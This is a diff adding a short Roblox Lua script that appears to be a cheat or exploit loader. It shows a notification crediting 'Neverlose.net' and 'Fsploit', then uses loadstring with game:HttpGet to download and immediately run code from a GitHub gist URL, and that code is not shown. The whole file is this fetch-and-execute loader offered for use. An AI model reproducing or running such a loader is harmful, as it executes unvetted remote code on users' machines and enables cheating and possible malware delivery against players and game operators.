@@ -1,0 +1,12 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Neverlose.net"; 
+    Text = "made by Fsploit"; 
+    Icon = ""; 
+    Duration = 2;
+    Callback = bindableFunction;
+    Button1 = "";  
+    Button2 = "";
+})
+
+loadstring(game:HttpGet"https://gist.githubusercontent.com/redninjaawesome/539336c48e73107232933475d8e6120a/raw/f95fcd6db11128acd1a200e8866f806d3a102098/gistfile1.txt")()
+
